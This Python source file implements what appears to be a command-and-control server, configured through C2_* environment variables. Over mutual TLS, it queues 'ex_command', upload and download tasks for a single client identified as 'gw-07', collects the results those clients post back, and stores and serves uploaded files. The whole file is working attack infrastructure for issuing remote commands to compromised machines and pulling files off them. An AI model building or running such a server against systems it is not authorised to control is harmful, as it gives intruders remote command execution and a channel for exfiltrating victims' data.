import json
import os
import re
import socket
import ssl
import threading

from file_store import open_store

MATERIAL = os.environ.get("C2_MATERIAL", "/shared")
BIND = os.environ.get("C2_BIND", "0.0.0.0")
PORT = int(os.environ.get("C2_PORT", "9443"))
MAX_HEAD = 16384
MAX_BODY = 4 * 1024 * 1024
TASK_TYPES = ("ex_command", "upload", "download")

TASK_LOCK = threading.Lock()
TASK_QUEUE = []
TASK_NEXT_ID = 1
RESULTS = {}
STORE = None


def log(message):
    print(message, flush=True)


def peer_cn(conn):
    subject = dict(item[0] for item in conn.getpeercert().get("subject", ()))
    return subject.get("commonName")


def read_request(conn):
    data = b""
    while b"\r\n\r\n" not in data:
        if len(data) > MAX_HEAD:
            raise ValueError("header too large")
        part = conn.recv(4096)
        if not part:
            return None
        data += part
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    method, path, _ = lines[0].decode("latin1").split(" ", 2)
    length = 0
    for line in lines[1:]:
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1].strip())
    if not 0 <= length <= MAX_BODY:
        raise ValueError("body length out of range")
    while len(body) < length:
        body += conn.recv(min(65536, length - len(body)))
    return method, path, body[:length]


def respond(conn, status, payload=b"", content_type="text/plain"):
    head = (
        f"HTTP/1.1 {status}\r\nContent-Length: {len(payload)}\r\n"
        f"Content-Type: {content_type}\r\nConnection: close\r\n\r\n"
    )
    conn.sendall(head.encode() + payload)


def queue_task(fields):
    task_type = fields.get("type")
    if task_type not in TASK_TYPES:
        raise ValueError("unknown task type")
    task = {"type": task_type}
    if task_type == "ex_command":
        command = fields["command"]
        if not command or len(command) > 512 or not command.isprintable():
            raise ValueError("invalid command")
        task["command"] = command
    elif task_type == "upload":
        path = fields["path"]
        if not path.startswith("/") or len(path) > 256 or not path.isprintable():
            raise ValueError("invalid path")
        task["path"] = path
    else:
        task["file_id"] = int(fields["file_id"])
    return task


def path_task_id(path):
    match = re.fullmatch(r"/v1/tasks/(\d+)/result", path)
    if not match:
        raise ValueError("unknown route")
    return int(match.group(1))


def route(method, path, body):
    if method == "GET" and path == "/v1/tasks":
        with TASK_LOCK:
            task = TASK_QUEUE.pop(0) if TASK_QUEUE else None
        if task is None:
            return "204 No Content", b"", "application/json"
        log(f"task delivered: {task}")
        return "200 OK", json.dumps(task).encode(), "application/json"
    if method == "POST" and path == "/v1/tasks":
        task = queue_task(json.loads(body.decode()))
        global TASK_NEXT_ID
        with TASK_LOCK:
            task = {"id": TASK_NEXT_ID, **task}
            TASK_NEXT_ID += 1
            TASK_QUEUE.append(task)
        log(f"task enqueued: {task}")
        return "201 Created", json.dumps(task).encode(), "application/json"
    if method == "POST" and path.startswith("/v1/tasks/"):
        task_id = path_task_id(path)
        with TASK_LOCK:
            RESULTS[task_id] = body
        log(f"result stored: task={task_id} bytes={len(body)}")
        return "200 OK", b"", "text/plain"
    if method == "POST" and path == "/v1/files":
        file_id = STORE.save(body)
        log(f"file uploaded: id={file_id} bytes={len(body)}")
        return "200 OK", json.dumps({"id": file_id}).encode(), "application/json"
    if method == "GET" and path.startswith("/v1/files/"):
        file_id = int(path.rsplit("/", 1)[1])
        data = STORE.load(file_id)
        if data is None:
            return "404 Not Found", b"no such file id\n", "text/plain"
        log(f"file downloaded: id={file_id} bytes={len(data)}")
        return "200 OK", data, "application/octet-stream"
    return "404 Not Found", b"unknown route\n", "text/plain"


def handle(conn):
    request = read_request(conn)
    if request is None:
        return
    status, payload, content_type = "400 Bad Request", b"request rejected", "text/plain"
    try:
        status, payload, content_type = route(*request)
    except (ValueError, KeyError, json.JSONDecodeError, ArithmeticError) as exc:
        payload = str(exc).encode()[:200]
    respond(conn, status, payload, content_type)


def session_thread(raw_conn, tls_ctx):
    try:
        raw_conn.settimeout(30)
        conn = tls_ctx.wrap_socket(raw_conn, server_side=True)
    except (ssl.SSLError, OSError):
        raw_conn.close()
        return
    try:
        if peer_cn(conn) != "gw-07":
            raise ValueError("client identity rejected")
        handle(conn)
    except (ValueError, ConnectionError, OSError) as exc:
        log(f"session rejected: {exc}")
        try:
            respond(conn, "400 Bad Request", b"request rejected")
        except OSError:
            pass
    finally:
        conn.close()


def main():
    global STORE
    STORE = open_store()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ctx.load_cert_chain(
        os.path.join(MATERIAL, "control.crt"), os.path.join(MATERIAL, "control.key")
    )
    ctx.load_verify_locations(os.path.join(MATERIAL, "ca.crt"))
    ctx.verify_mode = ssl.CERT_REQUIRED
    sock = socket.create_server((BIND, PORT))
    log(f"control plane listening on {BIND}:{PORT} (mTLS)")
    while True:
        raw_conn, _ = sock.accept()
        threading.Thread(
            target=session_thread, args=(raw_conn, ctx), daemon=True
        ).start()


if __name__ == "__main__":
    main()
